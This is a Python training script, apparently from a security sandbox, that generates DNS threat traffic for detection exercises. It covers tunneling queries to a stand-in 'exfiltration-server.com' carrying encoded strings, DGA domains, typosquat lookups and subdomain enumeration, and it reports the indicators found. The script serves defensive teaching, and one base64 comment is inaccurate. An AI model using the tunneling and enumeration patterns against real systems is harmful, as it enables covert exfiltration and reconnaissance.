#!/usr/bin/env python3
"""
DNS Threat Scenarios Generator
Educational tool for demonstrating DNS-based security threats.

This script simulates various DNS-based attack patterns including DNS tunneling,
domain generation algorithms, and malicious domain queries.

Author: Secure Architecture Sandbox Testing Environment
Purpose: Educational cybersecurity training
"""

import time
import socket
import sys
import random
import string
from datetime import datetime
import json


class DNSThreatSimulator:
    """Simulates DNS-based security threats for educational purposes."""

    def __init__(self):
        self.activity_log = []
        self.running = False

    def log_activity(self, activity_type, details, risk_level="HIGH"):
        """Log DNS threat activity with timestamp and risk assessment."""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'type': activity_type,
            'details': details,
            'risk_level': risk_level,
            'educational_note': self._get_educational_note(activity_type)
        }
        self.activity_log.append(entry)
        print(f"[{entry['timestamp']}] DNS-THREAT - {activity_type}: {details}")

    def _get_educational_note(self, activity_type):
        """Get educational explanation for each DNS threat type."""
        notes = {
            'DNS_TUNNELING': 'DNS tunneling uses DNS queries to exfiltrate data or establish covert channels',
            'DGA_QUERY': 'Domain Generation Algorithms create random domains to evade detection',
            'MALICIOUS_DOMAIN': 'Queries to known malicious domains indicate potential compromise',
            'EXCESSIVE_QUERIES': 'Unusually high DNS query volume may indicate tunneling or scanning',
            'SUBDOMAIN_ENUM': 'Subdomain enumeration is reconnaissance for attack planning',
            'DNS_CACHE_POISON': 'DNS cache poisoning attempts to redirect legitimate domains',
            'TYPOSQUATTING': 'Typosquatting domains mimic legitimate sites for phishing'
        }
        return notes.get(activity_type, 'Analyze this DNS threat pattern')

    def generate_dga_domains(self, seed_date=None):
        """Generate DGA-style domains using a simple algorithm."""
        if not seed_date:
            seed_date = datetime.now().strftime('%Y%m%d')

        # Simple DGA algorithm for educational purposes
        random.seed(int(seed_date))
        domains = []

        for i in range(10):
            domain_length = random.randint(8, 16)
            domain = ''.join(random.choices(
                string.ascii_lowercase, k=domain_length))
            tld = random.choice(
                ['.com', '.net', '.org', '.info', '.tk', '.ml'])
            domains.append(domain + tld)

        return domains

    def simulate_dns_tunneling(self, duration=60):
        """Simulate DNS tunneling for data exfiltration."""
        print(f"\n🕳️  Simulating DNS tunneling for {duration} seconds...")

        start_time = time.time()
        tunnel_count = 0

        # Base64-like data for tunneling simulation
        data_chunks = [
            "SGVsbG8gV29ybGQ",  # "Hello World" in base64
            "U2VjcmV0RGF0YQ",    # "SecretData" in base64
            "UGFzc3dvcmQ123",    # "Password123" in base64
            "Q29uZmlkZW50aWFs",  # "Confidential" in base64
        ]

        while time.time() - start_time < duration and self.running:
            # Create long subdomain typical of DNS tunneling
            data_chunk = random.choice(data_chunks)
            random_suffix = ''.join(random.choices(
                string.ascii_lowercase + string.digits, k=8))

            # Very long subdomain - characteristic of DNS tunneling
            subdomain = f"{data_chunk}.{random_suffix}.exfiltration-server.com"

            try:
                # Attempt DNS resolution (will fail, but creates the pattern)
                socket.gethostbyname(subdomain)
            except socket.gaierror:
                # Expected to fail - we're looking for the pattern
                pass

            self.log_activity(
                'DNS_TUNNELING',
                f"DNS tunnel query: {subdomain}",
                'CRITICAL'
            )

            tunnel_count += 1

            # High frequency is characteristic of tunneling
            time.sleep(random.uniform(0.5, 2))

        print(f"🕳️  Generated {tunnel_count} DNS tunneling queries")

    def simulate_dga_queries(self, duration=60):
        """Simulate Domain Generation Algorithm queries."""
        print(f"\n🎲 Simulating DGA queries for {duration} seconds...")

        start_time = time.time()
        dga_count = 0

        while time.time() - start_time < duration and self.running:
            # Generate DGA domains for current date
            dga_domains = self.generate_dga_domains()

            for domain in dga_domains[:5]:  # Test first 5 domains
                if not self.running or time.time() - start_time >= duration:
                    break

                try:
                    socket.gethostbyname(domain)
                except socket.gaierror:
                    # Expected - DGA domains usually don't exist
                    pass

                self.log_activity(
                    'DGA_QUERY',
                    f"DGA domain query: {domain}",
                    'HIGH'
                )

                dga_count += 1
                time.sleep(random.uniform(1, 3))

        print(f"🎲 Generated {dga_count} DGA domain queries")

    def simulate_malicious_domains(self, duration=60):
        """Simulate queries to known malicious domain patterns."""
        print(
            f"\n☠️  Simulating malicious domain queries for {duration} seconds...")

        # Educational examples of malicious domain patterns
        malicious_patterns = [
            # Phishing patterns
            "g00gle.com",
            "microsooft.com",
            "github-security.com",
            "paypal-verification.net",

            # C&C patterns
            "update-server-443.tk",
            "secure-connection.ml",
            "data-backup-service.ga",

            # Malware patterns
            "download-codec.info",
            "system-update-required.org",
            "security-scan-now.com"
        ]

        start_time = time.time()
        malicious_count = 0

        while time.time() - start_time < duration and self.running:
            domain = random.choice(malicious_patterns)

            try:
                socket.gethostbyname(domain)
            except socket.gaierror:
                # Expected - these are fake malicious domains
                pass

            self.log_activity(
                'MALICIOUS_DOMAIN',
                f"Malicious domain query: {domain}",
                'CRITICAL'
            )

            malicious_count += 1
            time.sleep(random.uniform(5, 15))

        print(f"☠️  Queried {malicious_count} malicious domains")

    def simulate_excessive_queries(self, duration=60):
        """Simulate excessive DNS query volume."""
        print(
            f"\n📈 Simulating excessive DNS queries for {duration} seconds...")

        legitimate_domains = [
            "google.com", "youtube.com", "facebook.com", "twitter.com",
            "amazon.com", "microsoft.com", "apple.com", "netflix.com"
        ]

        start_time = time.time()
        query_count = 0

        while time.time() - start_time < duration and self.running:
            domain = random.choice(legitimate_domains)

            try:
                socket.gethostbyname(domain)

                self.log_activity(
                    'EXCESSIVE_QUERIES',
                    f"High-volume DNS query: {domain}",
                    'MEDIUM'
                )

                query_count += 1

                # Very high frequency - suspicious pattern
                time.sleep(random.uniform(0.1, 0.5))

            except socket.gaierror as e:
                self.log_activity(
                    'EXCESSIVE_QUERIES',
                    f"DNS query failed: {domain} - {str(e)}",
                    'LOW'
                )

        print(f"📈 Generated {query_count} excessive DNS queries")

    def simulate_subdomain_enumeration(self, duration=60):
        """Simulate subdomain enumeration attacks."""
        print(
            f"\n🔍 Simulating subdomain enumeration for {duration} seconds...")

        target_domain = "example.com"
        common_subdomains = [
            "www", "mail", "ftp", "admin", "test", "dev", "staging",
            "api", "database", "backup", "secure", "internal",
            "vpn", "remote", "support", "helpdesk", "portal"
        ]

        start_time = time.time()
        enum_count = 0

        while time.time() - start_time < duration and self.running:
            subdomain = random.choice(common_subdomains)
            full_domain = f"{subdomain}.{target_domain}"

            try:
                socket.gethostbyname(full_domain)

                self.log_activity(
                    'SUBDOMAIN_ENUM',
                    f"Subdomain enumeration: {full_domain} - Found",
                    'MEDIUM'
                )

            except socket.gaierror:
                self.log_activity(
                    'SUBDOMAIN_ENUM',
                    f"Subdomain enumeration: {full_domain} - Not found",
                    'LOW'
                )

            enum_count += 1
            time.sleep(random.uniform(0.5, 2))

        print(f"🔍 Performed {enum_count} subdomain enumeration attempts")

    def simulate_typosquatting_queries(self, duration=60):
        """Simulate queries to typosquatting domains."""
        print(
            f"\n🎭 Simulating typosquatting queries for {duration} seconds...")

        # Typosquatting examples of popular sites
        typosquat_domains = [
            "googel.com",      # google.com typo
            "ytube.com",       # youtube.com typo
            "fcebook.com",     # facebook.com typo
            "amzon.com",       # amazon.com typo
            "micorsoft.com",   # microsoft.com typo
            "githib.com",      # github.com typo
            "gogle.com",       # google.com typo
            "yahooo.com"       # yahoo.com typo
        ]

        start_time = time.time()
        typo_count = 0

        while time.time() - start_time < duration and self.running:
            domain = random.choice(typosquat_domains)

            try:
                socket.gethostbyname(domain)
            except socket.gaierror:
                # Expected - these are fake typosquatting domains
                pass

            self.log_activity(
                'TYPOSQUATTING',
                f"Typosquatting domain query: {domain}",
                'HIGH'
            )

            typo_count += 1
            time.sleep(random.uniform(3, 10))

        print(f"🎭 Queried {typo_count} typosquatting domains")

    def run_scenario(self, duration=300):
        """Run the complete DNS threat simulation scenario."""
        print("🚨 Starting DNS Threat Simulation")
        print("=" * 50)
        print(f"Duration: {duration} seconds")
        print(f"Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        print("⚠️  WARNING: Simulating DNS-based threats for education")
        print("   Use only in controlled environments for learning purposes")
        print()

        self.running = True
        self.activity_log = []

        # Calculate time per activity
        activity_time = duration // 6

        activities = [
            ('DNS Tunneling', self.simulate_dns_tunneling),
            ('DGA Queries', self.simulate_dga_queries),
            ('Malicious Domains', self.simulate_malicious_domains),
            ('Excessive Queries', self.simulate_excessive_queries),
            ('Subdomain Enumeration', self.simulate_subdomain_enumeration),
            ('Typosquatting', self.simulate_typosquatting_queries)
        ]

        # Run activities sequentially for clarity
        for activity_name, activity_func in activities:
            if not self.running:
                break

            print(f"\n🔄 Starting {activity_name} phase...")
            activity_func(activity_time)

            if self.running:
                time.sleep(2)  # Brief pause between activities

        self.running = False

        print("\n" + "=" * 50)
        print("🚨 DNS Threat Simulation Complete")
        print(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total DNS threat activities: {len(self.activity_log)}")

        return self.activity_log

    def save_report(self, filename=None):
        """Save DNS threat activity report to file."""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"dns_threats_{timestamp}.json"

        # Categorize activities by type and risk
        activity_summary = {}
        risk_summary = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}

        for activity in self.activity_log:
            activity_type = activity['type']
            risk_level = activity['risk_level']

            if activity_type not in activity_summary:
                activity_summary[activity_type] = 0
            activity_summary[activity_type] += 1
            risk_summary[risk_level] += 1

        report = {
            'scenario': 'DNS Threat Simulation',
            'start_time': self.activity_log[0]['timestamp'] if self.activity_log else datetime.now().isoformat(),
            'end_time': self.activity_log[-1]['timestamp'] if self.activity_log else datetime.now().isoformat(),
            'total_activities': len(self.activity_log),
            'activity_summary': activity_summary,
            'risk_summary': risk_summary,
            'activities': self.activity_log,
            'dns_threat_indicators': [
                'Long subdomains with encoded data (DNS tunneling)',
                'Random domain patterns (Domain Generation Algorithms)',
                'High volume of DNS queries in short time periods',
                'Queries to suspicious TLDs (.tk, .ml, .ga)',
                'Typosquatting domains of popular sites',
                'Subdomain enumeration patterns'
            ],
            'detection_strategies': [
                'Monitor DNS query frequency and patterns',
                'Analyze subdomain length and entropy',
                'Check against known DGA algorithms',
                'Monitor queries to suspicious TLDs',
                'Implement DNS filtering and blacklists',
                'Analyze DNS response patterns and timing'
            ]
        }

        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"📄 DNS threat report saved to: {filename}")
        return filename


def main():
    """Main function to run the DNS threat simulation scenario."""
    print("🚨 DNS Threat Scenarios Generator")
    print("Educational Cybersecurity Tool")
    print()

    # Parse command line arguments
    duration = 300  # Default 5 minutes
    if len(sys.argv) > 1:
        try:
            duration = int(sys.argv[1])
        except ValueError:
            print("❌ Invalid duration. Using default 300 seconds.")

    print(f"⏱️  Scenario duration: {duration} seconds")
    print("\n🚨 This scenario will simulate:")
    print("  • DNS tunneling for data exfiltration")
    print("  • Domain Generation Algorithm queries")
    print("  • Malicious domain lookups")
    print("  • Excessive DNS query volume")
    print("  • Subdomain enumeration attacks")
    print("  • Typosquatting domain queries")
    print()
    print("⚠️  Educational Use Only - Simulated DNS Threats")
    print()

    input("Press Enter to start DNS threat simulation...")
    print()

    # Create and run scenario
    simulator = DNSThreatSimulator()

    try:
        activity_log = simulator.run_scenario(duration)

        # Save report
        report_file = simulator.save_report()

        # Display summary
        activity_counts = {}
        risk_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}

        for activity in activity_log:
            activity_type = activity['type']
            risk_level = activity['risk_level']

            if activity_type not in activity_counts:
                activity_counts[activity_type] = 0
            activity_counts[activity_type] += 1
            risk_counts[risk_level] += 1

        print("\n📊 DNS Threat Activity Summary:")
        print(f"  • Total activities: {len(activity_log)}")
        for activity_type, count in activity_counts.items():
            print(f"  • {activity_type}: {count}")

        print(f"\n🚨 Risk Level Distribution:")
        for risk_level, count in risk_counts.items():
            print(f"  • {risk_level}: {count}")

        print("\n🔍 Analysis Instructions:")
        print("  1. Look for DNS tunneling patterns (long subdomains)")
        print("  2. Identify DGA domain characteristics")
        print("  3. Monitor query frequency and volume")
        print(f"  4. Review detailed analysis in: {report_file}")

        print("\n💡 Key DNS Threat Indicators:")
        print("  • Long, encoded subdomains (tunneling)")
        print("  • Random domain generation patterns")
        print("  • High query frequency to non-existent domains")
        print("  • Queries to suspicious TLDs (.tk, .ml, .ga)")
        print("  • Typosquatting of popular domains")

    except KeyboardInterrupt:
        simulator.running = False
        print("\n⚠️  Scenario interrupted by user")
        print("Partial results may have been logged")

    except Exception as e:
        print(f"\n❌ Error during scenario execution: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
